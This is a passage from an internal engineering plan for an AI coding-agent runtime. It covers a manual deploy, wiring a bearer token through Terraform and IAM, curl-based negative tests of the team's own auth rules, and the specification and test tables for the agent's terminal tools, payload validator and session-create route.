**Deploy — manual, and it has a mandatory pre-flight.** CI builds and publishes on merge to `main`: `.github/workflows/publish-sherpa.yml` runs `pnpm --filter @nevado/runtime deploy --prod /tmp/sherpa-runtime` (`:80`), verifies `dist/index.js` and `node_modules/node-pty/build/Release/pty.node` (`:84-91`), tars it, and uploads to `s3://nevado-sherpa-artifacts-677109604084/runtime/sha-<git-sha>.tar.gz` (`:115-121`, `--sse AES256` is required by an org SCP), then overwrites `runtime/latest.txt` (`:126-130`). A human then deploys with the SSM RunCommand in `nevado-sherpa-tui/docs/AWS_DEPLOYMENT.md:578-610`.

**The pre-flight is not optional** (`AWS_DEPLOYMENT.md:553-576`): the deploy stops the service and replaces `/opt/sherpa` in place, so **anything in flight is lost**, and `SIGTERM` does not drain agent sessions (`index.ts:131-137`) and the concurrency queue is in-memory (§0.1.b C21). Curl `/health` over SSM first and proceed only when `activeSessions`, `queuedSessions` **and** `activePtySessions` are **all 0**. Counting TCP connections on :3000 is explicitly **not** a substitute — a session can exist with no socket attached.

**Rollback:** re-deploy a pinned SHA (`AWS_DEPLOYMENT.md:664-681`). Tarballs expire after 90 days (`:694`). The change is additive — a new prefix and a new route — so the human `/v1/workspace` surface is untouched and a rollback is only needed if the build itself is broken.

**Also raise separately, do not fold in:** Task 0.7's note about putting `sessionId` in the runtime's log lines. It is a small change in `apps/runtime` and it makes a cycle traceable to its logs, but it touches every log call site and does not belong in the commit that adds a namespace.

**Commit (in `nevado-sherpa-tui`):** `feat: add /v1/sdlc namespace with a health endpoint`

### Task 1.7 — wire the token and run the four negatives

**Files:**
- `infrastructure/lambdas.tf` (MOD — env vars + IAM on the dispatching Go Lambdas)
- `.github/workflows/deploy-dev.yml` (MOD, if any target is missing — see Task 1.5)

**Two env vars, not five.** §0.9.1 removed the M2M plumbing, and revision 6 replaced the certificate pair with the token:

| Name | Value |
|---|---|
| `SDLC_RUNTIME_API_BASE` | `"https://sherpa.${local.sherpa_subdomain}"` — **the EXISTING :443 listener. No port suffix and NO `/v1/sdlc` suffix.** Appending `:8443` in token mode dials a listener that does not exist and fails as a connection timeout; appending the prefix produces `/v1/sdlc/v1/sdlc/sessions`, because **the Go client owns that prefix** |
| `SDLC_AUTH_TOKEN_ARN` | **The same name on both sides of the contract** — Command Center's `config.Load` and the runtime's `loadConfig` read the identical variable, and the runtime must be given the same ARN so it can fetch the secret for itself |

Gone: `COGNITO_TOKEN_ENDPOINT`, `SDLC_M2M_CLIENT_SECRET_ARN`, `SDLC_M2M_SCOPE`, `SDLC_SHARED_SECRET_ARN`, and `SDLC_CLIENT_CERT_SECRET_ARN` as a *required* variable — the certificate ARNs (`SDLC_CLIENT_CERT_ARN`, `SDLC_CLIENT_KEY_ARN`, `SDLC_RUNTIME_CA_ARN`) remain wired for the inactive mTLS mode and are empty in token mode.

**Derive both values from the resources rather than passing them in.** They live in this state already, so telling Terraform what it can read for itself would mean: apply once to create the secret, have a human copy the ARN out, apply again to hand it back — **with a window in between where the caller points at nothing.** Referencing the resource makes it one apply, because the dependency graph orders the secret before the function whose environment names it.

**The base URL needs no ALB attribute either.** The runtime is reached at `sherpa.<customer_subdomain>`, a Route53 alias onto the ALB, so the URL is a pure function of inputs every deploy already passes and is known **at plan time, before any resource exists.** **`aws_lb.sherpa[0].dns_name` is the wrong value to reach for:** the ALB's own hostname is not covered by the ACM certificate the listener presents, so TLS to it fails server-certificate verification.

**Emit the ARN as an output, never the token.** The ARN is what the other side needs in order to fetch the secret for itself, which is how the credential crosses the repository boundary **without a human copying a value anywhere** — the step this mode exists to avoid. Do **not** mark that output `sensitive`: an ARN is not a secret, and marking it would redact the one value an operator must read out of a deploy log to configure the runtime.

**IAM:** `secretsmanager:GetSecretValue` scoped to that one secret ARN, on the dispatching Lambdas' role **and on the runtime's instance role** — the runtime reads the same secret. If a Lambda reuses `aws_iam_role.lambda_execution_role`, that policy is **already in the Core `-target=` list** at `deploy-dev.yml:428`, so editing it deploys with no new target entry.

#### The four negatives — the whole auth surface

An earlier revision had five, then three. **N1 and N2 tested API Gateway and are deleted with it. N4 and N6 tested a TLS handshake and are deleted with the 8443 listener** — there is no handshake to fail, because the client presents no certificate. What replaces them are two checks on the token itself, which is where the decision now lives.

**⚠ None of these has been run.** They are the acceptance procedure.

**N4 — no `Authorization` header at all → `403` from the ALB, before the instance.**
```
curl -sS -o /tmp/n4.txt -w '%{http_code}\n' --max-redirs 0 \
  https://sherpa.testing.nevado.ai/v1/sdlc/health
cat /tmp/n4.txt
```
Expected: **`403`** with `{"error":"forbidden"}` — from the **priority-8 deny**, because the request matches no forward.

- A **`302`** to `testing-control-center.auth.us-east-1.amazoncognito.com` means the deny rule is missing: the request fell through to the :443 default, which is `authenticate-cognito` with `OnUnauthenticatedRequest: authenticate` (verified live).
- A **`200`** means the default's `forward` was reached — i.e. **an authenticated human can call the machine namespace.** That is the hole the deny exists to close, and it is the one result here that is an incident.

**N4b — the same request from an authenticated browser session → still `403`.** Repeat N4 with a browser that already holds the Cognito session cookie, or with `--cookie` carrying `AWSELBAuthSessionCookie-0`. **This is the negative that matters most**, because it is the only one that exercises the actual hole: an unauthenticated browser would have been redirected anyway. Expected: **`403`, not `200`.**

**N5 — the correct token → `200`.**
```
TOKEN=$(aws secretsmanager get-secret-value --profile testing-tooling --region us-east-1 \
  --secret-id "$(cd infrastructure && terraform output -raw sdlc_auth_token_secret_arn)" \
  --query SecretString --output text | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

curl -sS -w '\n%{http_code}\n' -H "Authorization: Bearer $TOKEN" \
  https://sherpa.testing.nevado.ai/v1/sdlc/health
```
Expected: `200` with the runtime's `HealthResponse`. This is the **phase exit criterion**: the priority-6 rule matched, the target group forwarded, and the runtime served the namespace. **Note that `/health` is exempt from the ACL hook** (Task 1.6), so N5 proves *reachability*, not that the token was accepted — N5b is what proves that.

**N5b — a WRONG token on a non-health route → `403` from the RUNTIME, not from the ALB.**
```
curl -sS -o /tmp/n5b.txt -w '%{http_code}\n' -H "Authorization: Bearer not-the-token" \
  https://sherpa.testing.nevado.ai/v1/sdlc/sessions/does-not-exist
cat /tmp/n5b.txt
```
Expected: **`403`** with `{"error":"Forbidden"}` — **capital F, and the difference is the whole point of this negative.** The ALB's deny body is `{"error":"forbidden"}`; the runtime's ACL hook sends `{"error":"Forbidden"}`. **A lowercase body means the request never reached the runtime** (the header was not bearer-shaped, or the forward rule is missing), and a `404` means **the token was ACCEPTED** and the hook proceeded to the session lookup — which on a wrong token is the failure this negative exists to catch. Confirm the runtime logged a refusal carrying `bearerPresented: true`.

**⚠ The one failure mode no curl can detect.** If the instance is not running a build that carries the ACL hook, **N5b returns `404`** — the token check does not exist, so the request is admitted and only the session lookup fails. That is indistinguishable from a healthy runtime accepting a token it should have refused, on the status code alone. **N5b's assertion is therefore `403` AND the log line**, and the ordering constraint in Task 1.4's rollback note is what keeps it from arising.

#### The posture, recorded

**Write N4b's and N5b's results into the PR verbatim.** Together they state the boundary precisely, and state it honestly: reaching the runtime's SDLC namespace requires **possession of a shared token that lives in Terraform state**, checked by the runtime in constant time, behind an ALB rule that refuses anything not shaped like a machine call. **That is weaker than the mTLS posture an earlier revision described, and the difference must not be written up as if it were not:** a token is **replayable** if it leaks and a certificate is not, and rotation is a Secrets Manager write **plus a restart of both sides** rather than a reissue. §0.9.1 has the full trade-off.

A session on the other side still runs arbitrary commands with `bedrock:InvokeModel` on `*`, `secretsmanager:GetSecretValue` on the GitHub App private key, and push access to every repository the installation covers (§A.7.4). **So the token is a real credential and must be treated as one:** never logged — not the value, not a prefix, not a length, not inside an error — never emitted as a Terraform output, and rotated on a schedule someone owns, **while no session is live** (§0.9.1's rotation window).

**Rollback:** the env vars are additive and unread until Phase 2. **N4 or N4b returning `200` is the only result here that is an incident**, and the rollback is `aws elbv2 delete-rule` on the priority-6 forward — which closes the machine path immediately, leaves the deny in place, and costs only N5.

**Commit:** `feat: wire the SDLC runtime base URL and bearer token`

### Phase 1 exit criteria

All six, in order. Nothing downstream starts until all six pass. **⚠ None has been run — see the phase preamble.**

1. **The token secret exists and Terraform owns its value end to end.** `terraform output sdlc_auth_token_secret_arn` returns an ARN; the secret's `SecretString` parses as `{"token": …}`; **and no `openssl` was run, no CA exists, no bundle is in S3 and no expiry alarm was needed.** If any of those four appear, the wrong ingress mode was built.
2. **The human surface is untouched.** `describe-listeners` reports **exactly one listener, `443`, with `MTLS: "off"`**, and the plan showed no change to `aws_lb_listener.sherpa_https`, the priority-10 and -20 rules, or `aws_lb_target_group.sherpa`. **Do not assert on the plan's summary line** — Task 1.4's acceptance note explains why that assertion cannot be made to hold in general.
3. **The instance security group is unchanged** — port 3000 reachable only from `sg-0cb49292df9f5504e`, no CIDRs, and **no 8443 ingress anywhere on the ALB's group.** Re-asserted after the apply, not assumed.
4. **N4 returns `403`** and **N4b returns `403` from an authenticated browser session** — *not* a Cognito `302`, and *not* a `200`. **N4b is the criterion that proves the deny is doing the job it exists for.**
5. **N5 returns `200`** with the runtime's `HealthResponse`, using the real token.
6. **N5b returns `403` with `{"error":"Forbidden"}` on a WRONG token, and the runtime logged the refusal.** **This is the criterion that proves the ACL is real**, and the only one that distinguishes a runtime checking the token from a runtime that does not have the check deployed. A `404` here means the build on the instance predates the hook.
7. `pnpm build && pnpm --filter @nevado/runtime test` passes in `nevado-sherpa-tui`, including `sdlc.test.ts`, `auth-token.test.ts` and the prefix integration test.

**What this phase does not prove, and do not claim it does:** nothing about sessions, the session ACL predicate, events, or tools. It proves one HTTPS round trip reaches the runtime, that a wrong credential is refused **by the runtime**, and that the browser-reachability hole is closed.

**What it no longer needs to prove:** BQ1 and architecture doc U1 are **moot** (§0.9.1) — there is no Cognito token and no authorizer in this path. The 2026-09-24 evidence is retained in §0.4 as a platform fact for whoever next needs M2M auth. **And there is no chain to verify:** no CA, no trust store, no handshake.

### Phase 1 ordering and parallelism

```
1.6 (runtime /v1/sdlc namespace + ACL hook — manual SSM deploy TO THE INSTANCE)
      │
      ▼
1.4 (Terraform: secret, prio-6 forward, prio-8 deny) ──> 1.5 (targets) ──> 1.7 (negatives)
```

- **Tasks 1.1, 1.2, 1.2b and 1.3 are deleted** (§0.9.1). **Task 1.4 Step 1 — the CA ceremony — is deleted in revision 6.** Phase 1 is four tasks, and the ingress work is Terraform and nothing else.
- **The ordering is now SERIAL where it used to be parallel, and this is the substantive change.** Under mTLS the ALB refused an uncredentialed request itself, so the runtime's half could land in either order. Under the token **the runtime is the authenticator**, so 1.6's build must be **on the instance** before 1.4's mode is applied — otherwise "shaped like a machine call" is the only test any request faces. Terraform cannot enforce this; the human dispatching the apply does.
- **1.6 can still be written and merged in parallel with 1.4's Terraform.** It is *deploying* it that gates. Schedule the outage window early: the deploy is a **manual SSM RunCommand that kills every in-flight session**, human sessions included.
- **Land the priority-8 deny first if the two rules must be split.** It only ever denies, so it is safe ahead of any decision about mode — and the reverse order leaves a window in which a machine-shaped request reaches a runtime that may not be able to check it.
- **1.7 needs 1.4 and 1.5 applied AND 1.6 deployed.** Every negative hits the runtime or the rule in front of it.
- **Phase 0 runs in parallel with all of this.** No shared files.
- **Part 2's Phase 4b runs in parallel with all of this**, and it is a hard gate for Phase 3.


## Phase 2 — session create / read / cancel / release over HTTP, no events

**Blocked on Phase 1 passing all six exit criteria.**

**Goal:** CC starts a real `do` session against a throwaway repo with a trivial task, the agent commits and pushes, and CC polls `GET` until it sees `status: 'completed'` with a `commitSha`. **Polling is deliberate throwaway scaffolding** — it proves the execution loop before the transport exists, and Phase 3 deletes it.

**This phase is larger than the architecture doc implies**, for three reasons discovered in §0.1.b: the ACL is the first authorization in the service (C18, C19); `commitSha` and `baseBranch` are unreachable from `POST /sessions` and there is **no base-branch fetch at all** (C23); and `DELETE` has five deltas from the contract (C24). Budget accordingly.

**Two things got smaller after the architecture review.** The ACL is one predicate (`application === 'sdlc'`) rather than a `createdBy` partition scheme, and it needs **no SDK change** (BQ4, §0.1.d(2)). And the terminal tools collapsed from three to two, neither carrying an SDLC schema, so **this is the only SDK release the whole project needs** — Part 2's Phases 5 and 6 require none.

**Tasks in this phase, including two that changed identity after the review:** 2.0 (repurposed from a blocking investigation to a two-line SDK hygiene change), 2.1, 2.2, **2.2b (new — the `GET` and `cancel` routes, which no earlier task built)**, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8, 2.9.

### Task 2.0 — ~~unforce `createdBy` and `application` in the SDK~~ **DELETED (declined on merit)**

**This task was authorised, opened as `sherpa-sdk` #226 — "fix(core): default `createdBy` and `application` on session create instead of forcing them" — and CLOSED unmerged.** Recorded rather than silently dropped, because its rationale reads convincingly and someone will propose it again.

**The fact it missed: `createdBy` is not an inert attribution field. It backs a live ownership check.**

- `SessionManager.renameSession` throws `RemoteSessionNotOwnedError` when `record.createdBy !== this.userId`.
- `isSessionRenamable` (`@nevadoai/sherpa-protocol`) refuses a remote-only session the same way.
- Both fail **open** when the field is absent and **closed** when it disagrees.

So the change would let a caller **assert ownership of a session it does not own** — and on this runtime specifically, whose manager is `userId: 'dev-user'`, persisting an `m2m:…` value would make that comparison true and render **every SDLC session un-renameable.** A live human capability, traded for a label that (§A.3) still could not tell one machine caller from another.

**The "two lines, zero marginal cost" framing was wrong twice over**: there is no 4.0.2 release for it to ride (BQ3), and the cost was never the two lines — it was the invariant.

**The objection this task dismissed was correct.** An earlier draft argued that *"it loosens an invariant the SDK asserts deliberately"* does not survive scrutiny, on the grounds that `this.userId` is the literal `'dev-user'` and nothing validates it. **It does survive: the field is read as an authorization gate, in the human surface, today.** The forced block's comment — *"so a caller cannot forge id/name/status/createdBy/application"* — is describing a control, not a placeholder.

**What survives from this task, and it is the part that mattered:** the **silent-override hazard on `application` is real**, and the fix is not an SDK change. `application: 'sdlc'` survives the forced spread only *because* this runtime's manager has no `application` of its own; anyone who later passes `application: 'web'` to that constructor silently starts overriding `'sdlc'` and **quietly disables the entire ACL**, with no build failure. **Task 2.2's persistence assertion is the whole mitigation** — assert the value read back off the **persisted record**, not off the create argument or the response body — and `SDLC_APPLICATION` is pinned in the runtime's driftguard for the same reason.

**Nothing in Phase 2 was ever blocked on this task.** `application` is settable today (§0.1.d(2)), and that is all v1's ACL needs.

### Task 2.1 — add the three terminal tools and the schema validator **in the runtime**, behind `McpToolProvider`

**⚠ Revision 6 moves this task out of `sherpa-sdk` entirely.** It was specified as an SDK change riding a 4.0.2 release; **there is no 4.0.2 and no SDK change.** The tools reach the deployed `@nevadoai/sherpa-core@4.0.1` through its `McpToolProvider` seam — see **BQ3(a)** for the seam, why the earlier audit dismissed it, and the three costs it carries. Everything below is the corrected instruction; §A.5 is normative for behaviour.

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/sdlc/terminal-tools.ts` (NEW — one `McpToolProvider` per session, the three tool bodies, the double-submit guard)
- `apps/runtime/src/sdlc/terminal-tools.test.ts` (NEW)
- `apps/runtime/src/sdlc/result-schema.ts` (NEW — the generic validator, §A.5.3)
- `apps/runtime/src/sdlc/result-schema.test.ts` (NEW)
- `apps/runtime/src/sdlc/git-state.ts` (NEW — the `GitInspector` `reportCompletion` verifies against)
- `apps/runtime/src/sdlc/contract.ts` (NEW — the wire types, declared here rather than imported; see below)
- `apps/runtime/src/sdlc/contract.driftguard.test.ts` (NEW — pins the bounds, the allowlist and the SDK facts)

**Scope: all three tools, the generic `resultSchema` validator, the double-submit guard and the driftguard — in ONE runtime deploy.** The one-release argument is unchanged in substance and only changes which repo it applies to: the runtime has no deploy pipeline either, so each additional deploy is a manual SSM RunCommand that stops the service, `rm -rf`s `/opt/sherpa` and loses every in-flight session, human included.

| Item | Marginal cost in this deploy | Cost if deferred |
|---|---|---|
| `reportCompletion` (typed, **verifying**) | — | — |
| `submitPlan`, `submitReview` (opaque payloads) | ~20 lines each of shape/size checks | — |
| **`resultSchema` validator** (§A.5.3) | ~120 lines + tests, **no new dependency** | **one outage window** |
| **Double-submit guard** (§A.5.4a) | ~5 lines | one outage window |
| **The driftguard** | one test file | the bounds become changeable as a side effect of an unrelated edit |

**The types are DECLARED here, not imported, and that is the point of the seam.** `4.0.1`'s protocol package genuinely lacks three things, each handled locally rather than by a release:

- **`SessionApplication` is `'ide' | 'tui' | 'web'`**, so `'sdlc'` is not assignable. **Cast at the single `manager.create` call site.** A compile-time accommodation only: the value is settable at runtime because the forced spread is conditional on the manager's own `application` and the runtime builds its manager without one. (`sherpa-sdk` #227 later widened the union — **nothing consumes it**, and this cast is still what shipped.)
- **`SessionStatus` has no `'queued'`.** Nothing persists that value: it is a **create-response field only**, describing admission rather than session state, so the persisted union is untouched.
- **`CreateSessionRequest` carries none of the seven new fields**, which is why `SdlcCreateSessionRequest` is declared locally with **every field typed `unknown`** — it is a wire body from another service and every field is validated before use.

~~**Spec↔handler conformance test (P11a)**~~ — **not applicable here, and the reason matters.** The seam removes the drift it was written to catch: the model **never sees an `inputSchema`** (`listMcpTools` renders only `- **name**: description`), so there is no declared schema for a handler to disagree with. **The description IS the contract**, which is why the three descriptions are long and carry the argument list in prose. **The `saveLearnedPattern` / `updateTechDebt` drift in the deployed 4.0.1 stands as evidence for §A.5.0 and is now somebody else's bug to fix in the SDK** — `sherpa-sdk` has since landed a fix for the first (#223), which the runtime does not consume at `4.0.1`. Do not make an SDK conformance test a prerequisite for this task.

**Do not add `ajv`.** Unchanged, and now it applies to `apps/runtime` rather than `packages/core`. Neither tree has any validation dependency — verified, zero hits for `ajv|zod|json-schema|jsonschema`. `ajv` compiles schemas to JavaScript at runtime; doing that on **caller-supplied input** in a **long-lived multi-tenant process** is a worse trade than 120 lines of readable recursive descent over the bounded keyword set in §A.5.3. Hand-rolled is also the house style.

**⚠ `reportCompletion` VERIFIES. It does not commit or push.** This is the largest behavioural change revision 6 makes, and it is forced by the seam rather than chosen: `TOOL_METADATA.useMcpTool` is `{timeoutMs: 30_000, timeoutExempt: false}`, keyed on the **dispatcher** name and not overridable per proxied tool, and the engine's `withTimeout` resolves a `toolError` at the deadline **without cancelling the work.** A stage-commit-push-with-retry inside a 30-second budget would time out on a slow remote and leave the agent told it failed while the push completed — **the worst available outcome.** So the tool instructs the agent to commit and push **itself** with `runCommand`, then inspects the repository and **refuses a `'success'` outcome while anything is uncommitted or unpushed**, naming what is outstanding so the agent can fix it. §A.5.1 carries the corrected behaviour table.

**What that deletes from this task.** The primitives census below was the estimate for building commit/push inside the tool. **None of it is needed** — the agent already has `runCommand`, and `git` on the box is the implementation:

| Primitive | Fate |
|---|---|
| stage all changes, commit, push, push-with-retry | **Not built.** The agent does this with `runCommand`; the tool's job is to check it happened |
| empty-tree detection | **Kept, as a verification**, not as a pre-commit guard |
| branch resolution, HEAD state, changed-file list, ahead/behind | **This is the whole of `git-state.ts`** — a read-only `GitInspector`. `rev-parse --abbrev-ref HEAD` suffices because HEAD is not detached on a `commitSha` checkout (§0.1.b C22) |
| stderr surfacing | **Kept, and it is load-bearing**: `"not a git repository"` and `"unknown revision"` call for very different fixes, so surface git's own message rather than a sentence of your own |
| model id in the tool context | **Supplied by the runtime**, read at call time (`modelId: () => string`) so a mid-session model fallback is reflected |
| cumulative `TokenUsage` in the tool context | **Dropped.** Private fields on `AgentEngine`, unreachable from the seam, so `TerminalResult` carries **no `usage`**. The consumer's `CompletionPayload.usage` stays optional and is simply absent |

**Tests first.** `node:test` over compiled `dist/` (§0.2 runtime conventions), driving the provider in-process — no AWS, no engine.

`apps/runtime/src/sdlc/terminal-tools.test.ts`:

| Test name (sentence) | Fixture | Assertion |
|---|---|---|
| `it('advertises exactly one tool — the session''s own')` | provider built with `tool: 'submitPlan'` | `listTools()` has length 1 and names `submitPlan`. **The per-role separation, asserted as a set, not with `toContain`** |
| `it('refuses a tool name this session does not own')` | same provider, `executeTool('reportCompletion', …)` | `toolError` naming both the rejected tool and the one that is available. **This is what stops a plan session committing**, because every MCP tool arrives through one dispatcher entry and `PLAN_BLOCKED_TOOLS` cannot see past it |
| `it('accepts a success outcome only when the work is committed and pushed')` | a temp git repo, clean and pushed | `outcome: 'success'`, `commitSha` matches `git rev-parse HEAD`, `branch` matches `rev-parse --abbrev-ref HEAD`, `pushed: true` |
| `it('refuses a success outcome while changes are uncommitted')` | temp repo with a dirty file | `toolError` **naming what is outstanding**; no result recorded |
| `it('refuses a success outcome while a commit is unpushed')` | temp repo, committed, remote behind | `toolError` naming the unpushed state |
| `it('surfaces git''s own message when the repository cannot be inspected')` | a non-repository directory | `toolError` containing git's text — **assert on a substring of real git output, not a message you wrote**, so the test fails if the stderr stops being forwarded |
| `it('records where blocked work got to')` | dirty temp repo, `outcome: 'blocked'`, `blockedReason: 'needs a DB migration'` | `pushed: false`, `blockedReason` echoed, `branch`/`commitSha` from current HEAD, `filesModified` still populated |
| `it('rejects a blocked outcome with no reason')` | `outcome: 'blocked'`, no `blockedReason` | `toolError` |
| `it('rejects a call with no summary on either arm')` | both outcomes, no `summary` | `toolError`. **Required on the blocked arm too**: a blocked result the cycle cannot explain to a human is nearly as useless as no result |
| `it('unions the session''s filesModified with git''s changed-file list')` | session lists `a.ts`; a `runCommand` also changed `pnpm-lock.yaml` | both present, **sorted, no duplicates** |
| `it('reports the model actually used, not the one requested')` | `modelId()` returning a resolved id different from the requested one | `model` is the resolved one |
| `it('returns the recorded result as the tool result so the agent sees what was kept')` | success case | the returned content parses to the same object that was recorded |
| `it('treats laundered unparseable JSON as a parse failure, not a malformed call')` | input `{raw: '…'}` with no `outcome` | `toolError` saying the call could not be parsed and to resend it more compactly (§A.5.0a) |
| `it('rejects a second ACCEPTED submission but not a retry after a rejection')` | one schema-rejected call, then a valid one, then a third | first → `toolError`; second → recorded; third → `'already been submitted'`. **Both halves in one test**, because the guard must be claimed on acceptance only — §A.5.4a |

~~`it('is blocked in plan mode')`~~ — **deleted.** `PLAN_BLOCKED_TOOLS` cannot see a tool reached through `useMcpTool`, so there is nothing to assert. The `executeTool` name refusal above is what replaces it, and it is stricter: code rather than configuration (§A.5.4).

**Tests for the `resultSchema` validator** (§A.5.3). Two groups, and the second is the one that will be skipped if nobody insists on it.

*Group 1 — it enforces what it claims to:*

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it('rejects a payload missing a required property')` | schema requiring `summary`; payload without it | `toolError` naming the JSON Pointer path `/summary` and the expected type |
| `it('rejects a property of the wrong type')` | `requirements` declared `array`, payload sends a string | `toolError` naming `/requirements`. **This is the `PlanReview.jsx:19-20` crash case** — a truthy non-array `requirements` breaks the approval gate, and this is the check that converts it into a retry |
| `it('rejects a value outside an enum')` | `verdict` enum `['pass','fail']`, payload sends `'maybe'` | `toolError` naming the path and the permitted values |
| `it('rejects an undeclared property when additionalProperties is false')` | payload carries `technicalApproach` | `toolError`. §A.8a requires `technicalApproach` be **actively rejected**, not merely unrequired, and this is the generic mechanism that does it |
| `it('enforces maxItems and maxLength')` | schema with both; payload exceeding each | `toolError` per violation. **This is how CC's DynamoDB budget reaches the agent** (§A.4.3) |
| `it('accepts a conforming payload')` | — | no error. The regression guard, and it must ship with the others or the validator can pass by rejecting everything |
| `it('caps the error message length')` | schema requiring 300 properties; empty payload | the message is truncated and says so. An unbounded list of 300 failures is something the model cannot act on |

*Group 2 — the closed allowlist, and it is the group that matters most:*

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it('rejects a schema using a keyword outside the allowlist, rather than ignoring it')` | `resultSchema` containing `minLength` | **`400` at create**, naming the JSON Pointer path and the keyword `minLength`. **Repeat for `pattern`, `format`, `uniqueItems`, `$ref`, `allOf`, `const` — parameterise it.** This is the test that stops the validator reproducing the `saveLearnedPattern` defect (§A.5.3) |
| `it('rejects additionalProperties: true rather than accepting the key and ignoring the value')` | `{additionalProperties: true}` | `400`. Accepting the key while ignoring its value is the same defect in miniature |
| `it('accepts all nine allowlisted keywords')` | a schema exercising each | create succeeds. Pins the allowlist's contents so a future narrowing is a visible break |
| `it('rejects a schema over its bounds')` | 33 KB; depth 9; 301 nodes | `400` for each, naming which bound |
| `it('forwards unvalidated when resultSchema is absent')` | no `resultSchema`, non-conforming payload | publishes. **The kill switch** (§A.5.3), and the reason a validator is safe to ship behind an outage-gated release |

**Why group 2 is not optional.** A validator that silently skips keywords it does not implement is worse than no validator: Command Center authors a constraint, believes it is enforced in-session, and every payload passes. It is the identical failure to the shipped tool this whole redesign cites as its motivating example — and unlike that tool, this one would be built *after* we had the evidence.

**Implementation.** ~~Add the spec to `extendedToolSpecs`, add `reportCompletion` to `PLAN_BLOCKED_TOOLS`, add an entry to `TOOL_METADATA`, add the dispatch arm.~~ **None of that.** Nothing in `sherpa-sdk` is touched. Instead:

- **`createTerminalToolProvider(ctx)` returns an `McpToolProvider`** with `listTools()` and `executeTool(name, input)`. It is **stateful**: it holds the "already submitted" flag, **in memory and per session.** That is correct rather than a shortcut — a session that restarts has lost its turn loop anyway, and persisting it would put a store write on the tool-call path (§A.5.4a, and the same reasoning BQ2 applied to `seq`).
- **The tool name is the `kind` discriminator**, mapped `submitPlan → 'plan'`, `submitReview → 'review'`, `reportCompletion → 'engineering'`. That mapping is the *only* thing that survives the `useMcpTool` proxy, so it is what §A.5.2's dispatch rests on.
- **`inputSchema` is still declared on the spec**, for completeness and for any future surface that reads it — **but it is dead weight today** and must not be mistaken for the contract. Write the calling convention into the description.
- **The runtime supplies the context**: `sessionId`, the one `tool` this session owns, the opaque `resultSchema`, a read-only `GitInspector`, `modelId()`, `filesModified()`, and `onResult()`. Everything the tool cannot discover for itself is injected, and nothing it can discover is passed in.

**Acceptance.** No publish, no bump, no lockfile change:
```
pnpm build && pnpm --filter @nevado/runtime test
```
Expected: all suites pass, including `terminal-tools.test.ts`, `result-schema.test.ts` and `contract.driftguard.test.ts`. **`pnpm build` first is not optional** — tests run against `dist/`, so an uncompiled `.test.ts` runs nothing and still exits 0 (§0.2).

Then confirm the seam itself, which is the one claim a unit test cannot make:
```
node -e "const c=require('@nevadoai/sherpa-core'); console.log(typeof c.AgentEngine, 'McpToolProvider seam present')"
```
and assert in `pnpm-lock.yaml` that `@nevadoai/sherpa-core` still resolves to **`4.0.1`**. **A bumped version here means someone reintroduced the SDK dependency this task exists to avoid.**

**Commits (in `nevado-sherpa-tui`, one deploy, separate commits):**
- `feat: add the three SDLC terminal tools behind the MCP tool provider seam`
- `feat: validate terminal tool payloads against a caller-supplied schema`
- `fix: reject a second accepted terminal submission in the same session`
- `test: pin the SDLC contract bounds and the deployed engine's terminal edges`

### Task 2.2 — the SDLC session create route

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/routes/sdlc.ts` (MOD)
- `apps/runtime/src/routes/sdlc.test.ts` (MOD)

Implements `POST /sessions` per §A.2.1, under the `/v1/sdlc` prefix from Task 1.6.

**Extract the common core. Do not copy it, and do not write a fresh simpler version.** An earlier draft offered copying as a fallback *"if extraction looks risky"*; that is a decision the spec should make, not the implementer, and the honest prediction is that two copies drift within a month. **Extract.**

The existing `POST /sessions` handler (`routes/sessions.ts:237-371`) is 135 lines of hard-won validation and cleanup: the `body ?? {}` guard against a `null` body, shape-before-truthiness on `prompt`, `mode` validated before `manager.create` persists anything, `null`-to-`undefined` coercion once at the boundary, `checkSessionName` from the protocol package with the message passed through unrephrased, the branch-candidate fallback list, the GitHub-token acquire/release pairing, and the clone-failure path that destroys the workspace and deletes the session before returning `400`. **Every one of those exists because it broke.**

Extract it as a function taking the validated inputs and returning either a created session or a typed failure, then have both routes call it. The SDLC route adds its own validation **before** that call and its own response shaping after. If extraction genuinely cannot be done safely, that is a finding worth escalating — not a licence to fork 135 lines.

New validation this route adds, all per §A.2.1:

| Check | Response |
|---|---|
| `repoUrl` missing | `400` — optional on the human path, **required here** |
| both `branch` and `commitSha` | `400` |
| `commitSha` without `baseBranch` | `400` |
| `commitSha` not matching `isValidCommitSha` (`git-checkout.ts:13-15`, `/^[0-9a-f]{7,64}$/i`) | `400` |
| `profile` present without `correlation` | `400` |
| `correlation` missing `applicationId`, `cycleId` or `stage`, or not a flat object of non-empty strings within the courier bounds | `400`. **The `stage` *value* is never checked** — §A.2.1's courier rule, and Task 2.2's `it('accepts a correlation with a stage it has never heard of')` asserts it. An earlier revision listed a stage-enum `400` here, contradicting its own test two sections later |
| `resultSchema` present but malformed, over 32 KB, deeper than 8, over 300 nodes, or using an unsupported keyword | `400` — §A.5.3. A bad schema is a Command Center bug and must be loud at create, **never** a silent fall back to unvalidated |

**Do not implement `commitSha`/`baseBranch` behaviour in this task** — only the validation. The behaviour is Task 2.3, which is bigger.

**`status` in the response.** §A.2.1 explains why this is not a field rename: the handler currently returns before the concurrency gate is reached. Get the honest answer from `AgentWorker` — it reserves the slot synchronously at `worker.ts:134-136` with a deliberate no-`await`-in-between comment, so the information exists and is simply not returned. Change `startSession` to report its reservation decision, and while you are there fix the two related defects §A.2.1 names: `cancelSession` not dequeueing a parked resolver (`worker.ts:235-248`), and the queue having no depth cap. **Do not approximate `status` by comparing `activeCount` to `maxConcurrentSessions` in the route** — that is a race, and Part 2's stall handling trusts `'queued'` to mean "healthy, keep waiting".

**Tests first.** Extend `apps/runtime/src/routes/sdlc.test.ts` using the harness from `routes/sessions.test.ts:109-124` and the doubles in `routes/test-fixtures.ts`.

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it('creates a session and returns 201 with sessionId and status')` | valid body, `mode:'do'`, `repoUrl`, `prompt`, `profile`, `correlation` | `201`; body has `sessionId` and `status === 'active'` |
| `it('reports status queued when the worker has no free slot')` | `createMockWorker` configured to report the slot as queued | `201`, `status === 'queued'`, and **`workspacePath` absent** |
| `it('rejects a create with no repoUrl — an SDLC session has nothing to work on')` | omit `repoUrl` | `400`, body `{error}` |
